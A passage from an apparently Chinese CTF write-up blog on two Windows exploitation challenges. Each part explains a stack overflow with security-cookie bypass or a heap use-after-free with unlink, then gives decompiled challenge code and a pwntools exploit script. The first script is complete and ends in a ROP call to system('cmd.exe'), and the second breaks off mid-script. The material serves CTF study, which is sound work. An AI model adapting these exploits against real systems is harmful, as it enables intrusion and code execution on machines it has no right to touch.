+<h2 id="qwb2020-easyoverflow"><a href="#qwb2020-easyoverflow" class="headerlink" title="qwb2020-easyoverflow"></a>qwb2020-easyoverflow</h2><h3 id="程序逻辑-amp-amp-漏洞利用-1"><a href="#程序逻辑-amp-amp-漏洞利用-1" class="headerlink" title="程序逻辑 &amp;&amp; 漏洞利用"></a>程序逻辑 &amp;&amp; 漏洞利用</h3><p>程序没有开CFG，有栈溢出，可以leak三次数据。</p>
+<p>由于win的地址随机化的原因，我们先leak出pe_base/ntdll_base，然后leak gs，利用栈溢出的rop将security_cookie泄露出来进而异或得到rsp栈地址，注意此时pop rbx=1可以重复进行rop，再二次溢出根据read@iat得到ucrtdll_base，第三次溢出执行system(“cmd.exe”)。</p>
+<p>win x64的前四个参数寄存器为rcx rdx r8 r9。</p>
+<p>注意后面溢出的时候rsp值改变，相应的gs值也要修改为new_rsp ^ security_cookie。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">main_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  FILE *v1; <span class="comment">// rax</span></span><br><span class="line">  FILE *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [rsp+20h] [rbp-118h]</span></span><br><span class="line"></span><br><span class="line">  v0 = (FILE *)_acrt_iob_func(<span class="number">0</span>i64);</span><br><span class="line">  setbuf(v0, <span class="number">0</span>i64);</span><br><span class="line">  v1 = (FILE *)_acrt_iob_func(<span class="number">1</span>i64);</span><br><span class="line">  setbuf(v1, <span class="number">0</span>i64);</span><br><span class="line">  v2 = (FILE *)_acrt_iob_func(<span class="number">2</span>i64);</span><br><span class="line">  setbuf(v2, <span class="number">0</span>i64);</span><br><span class="line">  v3 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v3;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;Dst, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"buffer:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;Dst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'10.210.108.240'</span>, <span class="number">10030</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"input:\r\n"</span>, <span class="string">"a"</span>*size)</span><br><span class="line">    p.recvuntil(<span class="string">"buffer:\r\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"a"</span>*size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ntdll</span></span><br><span class="line">p_rdx_rcx_r8_r9_r2 = <span class="number">0x8B540</span></span><br><span class="line">p_rbx = <span class="number">0xF70BF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pe file</span></span><br><span class="line">puts_offset = <span class="number">0x10a6</span></span><br><span class="line">read_import = <span class="number">0x2178</span></span><br><span class="line">cookie_offset = <span class="number">0x3008</span></span><br><span class="line">ret_address = <span class="number">0x10ca</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ucrtbase</span></span><br><span class="line">system_address = <span class="number">0xae5d0</span></span><br><span class="line">cmd_address = <span class="number">0xd0c00</span></span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">leak(<span class="number">0x100</span>)</span><br><span class="line">gs_value = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"gs_value &#123;&#125;"</span>.format(hex(gs_value)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak(0x118)</span></span><br><span class="line"><span class="comment"># pe_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x12f4</span></span><br><span class="line"><span class="comment"># log.success("pe base &#123;&#125;".format(hex(pe_base)))</span></span><br><span class="line"><span class="comment">#leak(0x118)</span></span><br><span class="line"><span class="comment">#pe_base = u64(p.recvn(6).ljust(8,'\x00')) - 0x12f4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak ntdll</span></span><br><span class="line">pe_base = <span class="number">0x7ff69f6e0000</span></span><br><span class="line">log.success(<span class="string">"pe base =&gt; "</span> + hex(pe_base))</span><br><span class="line">leak(<span class="number">0x188</span>)</span><br><span class="line">ntdll_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x4cec1</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ntdll_base = <span class="number">0x7ffddc5d0000</span></span><br><span class="line">log.success(<span class="string">"ntdll base =&gt; "</span> + hex(ntdll_base))</span><br><span class="line"><span class="comment">#leak s_cookie</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(gs_value)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(ntdll_base+p_rdx_rcx_r8_r9_r2)+p64(<span class="number">0</span>)+p64(pe_base+cookie_offset)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(ntdll_base+p_rbx)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pe_base+puts_offset)</span><br><span class="line">p.recvuntil(<span class="string">"input:\r\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">security_cookie = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"security cookie =&gt; "</span> + hex(security_cookie))</span><br><span class="line">old_rsp = security_cookie ^ gs_value</span><br><span class="line">log.success(<span class="string">"old rsp =&gt; "</span> + hex(old_rsp))</span><br><span class="line">new_rsp = old_rsp + <span class="number">0x188</span></span><br><span class="line">input_addr = new_rsp + <span class="number">0x20</span></span><br><span class="line">new_gs = new_rsp ^ security_cookie</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"new rsp =&gt; "</span> + hex(new_rsp))</span><br><span class="line">log.success(<span class="string">"new gs =&gt; "</span> + hex(new_gs))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(new_gs)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(ntdll_base+p_rdx_rcx_r8_r9_r2)+p64(<span class="number">0</span>)+p64(pe_base+read_import)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(ntdll_base+p_rbx)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pe_base+puts_offset)</span><br><span class="line">p.recvuntil(<span class="string">"input:\r\n"</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ucrt = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">ucrt_base = ucrt - <span class="number">0x17bc0</span></span><br><span class="line">log.success(<span class="string">"ucrt base =&gt; "</span> + hex(ucrt_base))</span><br><span class="line"></span><br><span class="line">new_rsp = new_rsp + <span class="number">0x188</span></span><br><span class="line">new_gs = new_rsp ^ security_cookie</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(new_gs)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(ntdll_base+p_rdx_rcx_r8_r9_r2)+p64(<span class="number">0</span>)+p64(ucrt_base+cmd_address)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(ucrt_base+system_address)</span><br><span class="line">p.recvuntil(<span class="string">"input:\r\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="SCTF2020-EasyWinHeap"><a href="#SCTF2020-EasyWinHeap" class="headerlink" title="SCTF2020-EasyWinHeap"></a>SCTF2020-EasyWinHeap</h2><h3 id="程序逻辑-amp-漏洞利用"><a href="#程序逻辑-amp-漏洞利用" class="headerlink" title="程序逻辑 &amp; 漏洞利用"></a>程序逻辑 &amp; 漏洞利用</h3><p>堆菜单题，有溢出和UAF。bss上先分配了一大块堆地址用于存放chunks，先UAF+Show leak出heap_addr，进而unlink达到任意地址写的效果。</p>
+<p>这里多提一下win的unlink，在AngelBoy的Slide里有提到win的unlink更加简单，因为flink和blink指向的是data_ptr，因此只需要伪造<code>fd = &amp;p-8，bk= &amp;p</code>即可。另外为了绕过检查我们需要先释放chunk1 chunk3，再编辑chunk1，这样是为了绕过list_head的检查。另外很有意思的是在后面的一个check失败的情况下程序也不会abort，而是阻止新chunk插入链表，详情可以看ppt。之后再释放chunk0即可触发unlink，地址任意写，将chunk_addr改成heap_addr来leak上面的pe_addr，最后在iat表泄露出urctbase，通过<code>s -a 0 L?80000000/2 &quot;cmd.exe&quot;</code>搜索cmd字符串，通过<code>u ucrtbase!system</code>查看system函数地址，最后任意地址写将函数指针改为system，布置cmd到堆上。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// eax</span></span><br><span class="line">  FILE *v1; <span class="comment">// eax</span></span><br><span class="line">  FILE *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> (__cdecl *v3)(<span class="keyword">const</span> <span class="keyword">char</span> *); <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> global_idx; <span class="comment">// esi</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// eax</span></span><br><span class="line">  SIZE_T v6; <span class="comment">// ST34_4</span></span><br><span class="line">  LPVOID chunk_addr; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx1; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v19; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v0 = (FILE *)_acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setvbuf(v0, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = (FILE *)_acrt_iob_func(<span class="number">1</span>);</span><br><span class="line">  setvbuf(v1, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  v2 = (FILE *)_acrt_iob_func(<span class="number">2</span>);</span><br><span class="line">  setvbuf(v2, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  hHeap = HeapCreate(<span class="number">1u</span>, <span class="number">0x2000</span>u, <span class="number">0x2000</span>u);</span><br><span class="line">  v3 = (<span class="keyword">void</span> (__cdecl *)(<span class="keyword">const</span> <span class="keyword">char</span> *))<span class="built_in">puts</span>;</span><br><span class="line">  dword_40338C = (<span class="keyword">int</span>)HeapAlloc(hHeap, <span class="number">9u</span>, <span class="number">0x80</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3(<span class="string">"/----------------------\\"</span>);</span><br><span class="line">    v3(<span class="string">"|   1: Alloc.          |"</span>);</span><br><span class="line">    v3(<span class="string">"|   2: Delete.         |"</span>);</span><br><span class="line">    v3(<span class="string">"|   3: Show.           |"</span>);</span><br><span class="line">    v3(<span class="string">"|   4: Edit.           |"</span>);</span><br><span class="line">    v3(<span class="string">"|   5: Exit.           |"</span>);</span><br><span class="line">    v3(<span class="string">"\\----------------------/"</span>);</span><br><span class="line">    v3(<span class="string">"option &gt;"</span>);</span><br><span class="line">    Scanf(<span class="string">"%ud"</span>, &amp;choice);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        global_idx = <span class="number">0</span>;</span><br><span class="line">        v5 = (_DWORD *)(dword_40338C + <span class="number">0xC</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v3(<span class="string">"index &gt;"</span>);</span><br><span class="line">        Scanf(<span class="string">"%ud"</span>, &amp;idx);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( idx &gt;= <span class="number">0x10</span> || !*(_DWORD *)(dword_40338C + <span class="number">8</span> * idx + <span class="number">4</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">        HeapFree(hHeap, <span class="number">1u</span>, *(LPVOID *)(dword_40338C + <span class="number">8</span> * idx + <span class="number">4</span>));<span class="comment">// UAF</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3(<span class="string">"index &gt;"</span>);</span><br><span class="line">        Scanf(<span class="string">"%ud"</span>, &amp;idx1);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( idx1 &gt;= <span class="number">0x10</span> || !*(_DWORD *)(dword_40338C + <span class="number">8</span> * idx1 + <span class="number">4</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">        ((<span class="keyword">void</span> (__cdecl *)(_DWORD))(*(_DWORD *)(dword_40338C + <span class="number">8</span> * idx1) &amp; <span class="number">0xFFFFFFF0</span>))(*(_DWORD *)(dword_40338C</span><br><span class="line">                                                                                                  + <span class="number">8</span> * idx1</span><br><span class="line">                                                                                                  + <span class="number">4</span>));</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v3(<span class="string">"index &gt;"</span>);</span><br><span class="line">        Scanf(<span class="string">"%ud"</span>, &amp;v16);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( v16 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">        v9 = <span class="number">8</span> * v16;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">8</span> * v16 + dword_40338C + <span class="number">4</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">        v3(<span class="string">"content  &gt;"</span>);</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        v11 = *(_DWORD *)(v9 + dword_40338C);</span><br><span class="line">        v12 = *(_DWORD *)(v9 + dword_40338C + <span class="number">4</span>);</span><br><span class="line">        v15 = <span class="number">16</span> * (v11 &amp; <span class="number">0xF</span>);</span><br><span class="line">        v13 = getchar();</span><br><span class="line">        <span class="keyword">if</span> ( v13 != <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v10++ + v12) = v13;</span><br><span class="line">            <span class="keyword">if</span> ( v10 == v15 - <span class="number">1</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v13 = getchar();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v13 != <span class="number">10</span> );</span><br><span class="line">          v3 = (<span class="keyword">void</span> (__cdecl *)(<span class="keyword">const</span> <span class="keyword">char</span> *))<span class="built_in">puts</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(_BYTE *)(v10 + v12) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(v5 - <span class="number">2</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">if</span> ( !*v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v5[<span class="number">2</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        global_idx += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !v5[<span class="number">4</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        global_idx += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">      global_idx += <span class="number">4</span>;</span><br><span class="line">      v5 += <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">if</span> ( global_idx &gt;= <span class="number">0x10</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">    ++global_idx;</span><br><span class="line">LABEL_13:</span><br><span class="line">    <span class="keyword">if</span> ( global_idx == <span class="number">16</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">    v3(<span class="string">"size &gt;"</span>);</span><br><span class="line">    Scanf(<span class="string">"%ud"</span>, &amp;v19);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v19 &gt; <span class="number">0x90</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = (v19 &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">    chunk_addr = HeapAlloc(hHeap, <span class="number">1u</span>, v6);</span><br><span class="line">    v8 = dword_40338C;</span><br><span class="line">    *(_DWORD *)(dword_40338C + <span class="number">8</span> * global_idx) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">puts</span> | v6;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">8</span> * global_idx + <span class="number">4</span>) = chunk_addr;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">  v3(<span class="string">"Error!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'10.210.108.240'</span>, <span class="number">10031</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn', 28789)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"option &gt;"</span>,str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(sz)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size &gt;"</span>,str(sz))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index &gt;"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index &gt;\r\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    